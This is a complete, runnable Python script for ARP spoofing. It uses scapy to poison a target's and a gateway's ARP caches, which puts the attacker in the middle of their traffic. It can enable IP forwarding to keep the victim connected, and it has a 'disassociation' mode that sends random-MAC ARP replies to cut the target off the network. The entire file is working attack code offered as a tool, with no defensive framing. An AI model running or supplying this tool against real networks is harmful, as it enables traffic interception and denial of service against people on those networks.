#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import netifaces
import random
import time
from colorama import Fore, init

class ArpSpoofer:
		def __init__(self, args):
				init(autoreset=True)  # Initialize colorama
				self.target_ip = args.target
				# Use provided gateway or get router IP if not provided.
				self.gateway_ip = args.gateway if args.gateway is not None else self.get_router_ip()
				# Use provided interface or get the active interface.
				self.interface = args.interface if args.interface is not None else self.get_active_interface()
				self.disassociate_flag = args.disassociate
				self.ipforward = args.ipforward

				self.target_mac = self.get_mac(self.target_ip)
				self.gateway_mac = self.get_mac(self.gateway_ip)
				self.attacker_ip, self.attacker_mac = self.get_attacker_info(self.interface)

				print(Fore.CYAN + "[+] Interface:", self.interface)
				print(Fore.CYAN + "[+] Target IP:", self.target_ip)
				print(Fore.CYAN + "[+] Gateway IP:", self.gateway_ip)
				print(Fore.CYAN + "[+] Target MAC:", self.target_mac)
				print(Fore.CYAN + "[+] Gateway MAC:", self.gateway_mac)
				print(Fore.CYAN + "[+] Attacker IP:", self.attacker_ip)
				print(Fore.CYAN + "[+] Attacker MAC:", self.attacker_mac)
				print(Fore.CYAN + "[+] IP Forwarding:", "Enabled" if self.ipforward else "Disabled")
				print(Fore.CYAN + "[+] Disassociation Mode:", "Enabled" if self.disassociate_flag else "Disabled")

				if self.ipforward:
						self.enable_ip_forward()

		def get_active_interface(self):
				gateways = netifaces.gateways()
				default_gateway = gateways.get('default', {})
				if netifaces.AF_INET in default_gateway:
						return default_gateway[netifaces.AF_INET][1]
				return None

		def get_router_ip(self):
				gateways = netifaces.gateways()
				default_gateway = gateways.get('default', {})
				if netifaces.AF_INET in default_gateway:
						return default_gateway[netifaces.AF_INET][0]
				return None

		def get_mac(self, ip):
				request = scapy.ARP(pdst=ip)
				broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
				packet = broadcast / request
				ans, _ = scapy.srp(packet, iface=self.interface, timeout=2, verbose=False)
				if ans:
						return ans[0][1].hwsrc
				return None

		def get_attacker_info(self, iface):
				try:
						addrs = netifaces.ifaddresses(iface)
						# Get IPv4 address
						ip_info = addrs.get(netifaces.AF_INET, [{}])[0]
						attacker_ip = ip_info.get('addr')
						# Get MAC address
						mac_info = addrs.get(netifaces.AF_LINK, [{}])[0]
						attacker_mac = mac_info.get('addr')
						return attacker_ip, attacker_mac
				except Exception as e:
						print(Fore.RED + "[!] Error retrieving attacker info on interface", iface, ":", e)
						return None, None

		def spoof(self,t_ip,t_mac,send_ip,send_mac):
				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip,hwsrc=send_mac)
				packet=scapy.Ether(dst=t_mac)/reply
				scapy.sendp(packet, iface=self.interface, verbose=False)
				print(Fore.YELLOW + "[+] Sent ARP reply to", self.target_ip, "spoofing as", self.gateway_ip)

		def restore(self,t_ip,t_mac,send_ip,send_mac):
				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip, hwsrc=send_mac)
				packet=scapy.Ether(dst=t_mac)/reply
				scapy.sendp(packet, iface=self.interface, count=5, verbose=False)
				print(Fore.GREEN + "[+] Restored ARP table for", t_ip)

		def enable_ip_forward(self):
				with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
						f.write("1")
				print(Fore.MAGENTA + "[+] IP forwarding enabled")

		def random_mac_gen(self):
				hexchars = "ABCDEF01234567"
				return ":".join(''.join(random.choices(hexchars, k=2)) for _ in range(6))

		def disassociate(self):
				rand_mac = self.random_mac_gen()
				packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=rand_mac)
				scapy.send(packet, iface=self.interface, verbose=False)
				print(Fore.RED + "[+] Sent disassociation packet with random MAC", rand_mac)

		def execute(self):
				try:
						while True:
								if self.disassociate_flag:
										self.disassociate()
								else:
										self.spoof(self.target_ip,self.target_mac,self.gateway_ip,self.attacker_mac)
										self.spoof(self.gateway_ip,self.gateway_mac,self.target_ip,self.attacker_mac)
								time.sleep(10)  # Adjust as necessary
				except KeyboardInterrupt:
						print(Fore.RED + "[!] Detected CTRL+C, restoring ARP tables...")
						self.restore(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
						self.restore(self.gateway_ip,self.gateway_mac,self.target_ip,self.target_mac)
						print(Fore.GREEN + "[+] ARP tables restored, exiting.")

if __name__ == "__main__":
		parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
		parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof")
		parser.add_argument("-s", "--gateway", required=False, help="IP address to spoof (usually the gateway)")
		parser.add_argument("-i", "--interface", required=False, help="Network interface (e.g., eth0, wlan0)")
		parser.add_argument("-d", "--disassociate", action="store_true", help="Enable disassociation attack (random MAC)")
		parser.add_argument("-ipf", "--ipforward", action="store_true", help="Enable IP forwarding to maintain victim-router connection")
		args = parser.parse_args()

		spoofer = ArpSpoofer(args)
		spoofer.execute()
